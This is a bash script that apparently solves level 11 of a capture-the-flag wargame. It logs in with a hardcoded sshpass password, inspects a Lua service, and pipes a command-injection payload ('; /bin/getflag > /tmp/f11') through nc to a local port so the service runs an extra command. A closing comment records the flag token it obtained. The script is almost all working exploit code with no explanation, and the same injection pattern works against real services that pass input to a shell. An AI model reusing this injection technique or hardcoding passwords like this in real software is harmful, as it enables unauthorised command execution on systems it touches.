#!/bin/bash

ssh() {
    sshpass -p 'feulo4b72j7edeahuete3no7c' ssh level11@localhost -p 2220 "$1"  
}

ssh "ls -la"

ssh "getfacl level11.lua"

ssh "cat level11.lua"

ssh 'ps aux | grep lua'

ssh 'printf "hello > /tmp/test\n" | nc 127.0.0.1 5151'

ssh 'cat /tmp/test'

read pause

ssh 'printf "; /bin/getflag > /tmp/f11\n" | nc 127.0.0.1 5151'

sleep 2

ssh 'cat /tmp/f11'

ps aux | grep lua
#Password: 
test; getflag > /tmp/flag

# Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
